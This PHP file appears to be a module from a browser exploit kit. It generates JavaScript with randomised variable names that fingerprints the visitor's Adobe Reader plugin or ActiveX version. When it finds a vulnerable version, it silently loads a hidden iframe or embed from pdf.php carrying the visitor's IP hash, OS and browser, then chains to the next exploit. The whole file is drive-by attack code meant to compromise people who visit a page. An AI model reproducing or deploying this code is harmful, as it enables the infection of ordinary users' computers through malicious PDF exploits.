<?php
/**
 *
 * @	Version			:	1.1.7.0
 * @	Author			:	DrWhat
 * @	Release on		:	25.02.2013
 *
 */

$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
$functionName = $ExploitFunctions[8];
$eArray[] = '
function ' . $functionName . '(){
' . ($browser == 'ie' ? '
if (window.ActiveXObject){
	var ' . $randVar[4] . ' = null;
	try {
		' . $randVar[4] . ' = new ActiveXObject(\'AcroPDF.PDF\');
	}catch (e) {}
		if (!' . $randVar[4] . ') {
		try {
			' . $randVar[4] . ' = new ActiveXObject(\'PDF.PdfCtrl\');
		}catch (e) {}
	}
	if (' . $randVar[4] . ') {
		var ' . $randVar[8] . ' = ' . $randVar[4] . '.GetVersions().split(\',\')[0].split(\'=\')[1].split(\'.\');
		if (' . $randVar[8] . '[0] <= 9 && ' . $randVar[8] . '[1] < 2){
				var ' . $randVar[3] . ' = document.createElement(\'iframe\');
				' . $randVar[3] . '.setAttribute(\'src\', \'./pdf.php?pdf=' . $GLOBALS['iphash'] . '&type=1&o=' . $os . '&b=' . $browser . '\');
				' . $randVar[3] . '.setAttribute(\'width\', ' . rand( 1, 100 ) . ');
				' . $randVar[3] . '.setAttribute(\'height\', ' . rand( 1, 100 ) . ');
				' . $randVar[3] . '.setAttribute(\'style\', \'display:none;\');
				document.body.appendChild(' . $randVar[3] . ');
		}
	}
}' : '
var ' . $randVar[0] . '  = false;
if (navigator.plugins && navigator.plugins.length)
{
	for (var ' . $randVar[1] . ' = 0; ' . $randVar[1] . ' < navigator.plugins.length; ' . $randVar[1] . '++)
	{
		if (navigator.plugins[' . $randVar[1] . '].description.indexOf(\'Adobe Acrobat\') !=- 1) {
			' . $randVar[0] . ' = true;
			break;
		}
		if (navigator.plugins[' . $randVar[1] . '].description.indexOf(\'Adobe PDF\') !=- 1) {
			' . $randVar[0] . ' = true;
			break;
		}
	}
	if (' . $randVar[0] . '){
		var ' . $randVar[2] . ' = document.createElement(\'embed\');
		' . $randVar[2] . '.setAttribute(\'src\', \'./pdf.php?pdf=' . $GLOBALS['iphash'] . '&type=1&o=' . $os . '&b=' . $browser . '\');
		' . $randVar[2] . '.setAttribute(\'width\', ' . rand( 1, 100 ) . ');
		' . $randVar[2] . '.setAttribute(\'height\', ' . rand( 1, 100 ) . ');
		' . $randVar[2] . '.setAttribute(\'style\', \'border:none\');
		' . $randVar[2] . '.setAttribute(\'type\', \'application/pdf\');
		document.body.appendChild(' . $randVar[2] . ');
	}else{
		{next}
		return;
	}
}') . '
setTimeout("{next}", 2500);
}';
?>
